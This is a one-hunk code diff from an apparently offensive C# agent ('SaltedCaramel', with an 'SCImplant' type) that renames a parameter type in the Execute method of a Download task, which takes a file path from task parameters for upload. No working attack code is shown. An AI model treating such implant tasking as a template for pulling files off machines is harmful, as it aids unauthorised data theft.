@@ -11,7 +11,7 @@ namespace SaltedCaramel.Tasks
 {
     public class Download
     {
-        public static void Execute(SCTaskObject task, SCImplant implant)
+        public static void Execute(SCTask task, SCImplant implant)
         {
             string filepath = task.@params;
             try // Try block for file upload task
